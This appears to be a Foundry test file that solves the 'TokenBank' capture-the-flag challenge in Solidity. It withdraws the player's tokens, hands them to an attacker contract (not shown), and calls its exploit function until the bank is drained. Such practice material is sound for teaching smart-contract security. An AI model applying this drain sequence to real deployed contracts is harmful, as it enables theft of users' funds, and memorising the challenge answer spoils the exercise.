// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/TokenBank.sol";

contract TankBankTest is Test {
    TokenBankChallenge public tokenBankChallenge;
    TokenBankAttacker public tokenBankAttacker;
    address player = address(1234);

    function setUp() public {}

    function testExploit() public {
        tokenBankChallenge = new TokenBankChallenge(player);
        tokenBankAttacker = new TokenBankAttacker(address(tokenBankChallenge));

        // Put your solution here
        // withdraw player balance
        tokenBankChallenge.withdraw(500_000 * 1 ether);
        assert(tokenBankChallenge.token().balanceOf(address(this)) == 500_000 * 1 ether);

        // send balance to attacker contract
        tokenBankChallenge.token().transfer(address(tokenBankAttacker), 500_000 * 1 ether);

        // execute exploit
        tokenBankAttacker.exploit(player);
        assert(tokenBankChallenge.token().balanceOf(address(player)) == 1_000_000 * 1 ether);

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(tokenBankChallenge.isComplete(), "Challenge Incomplete");
    }

    function tokenFallback(address, uint256, bytes memory) public {}
}
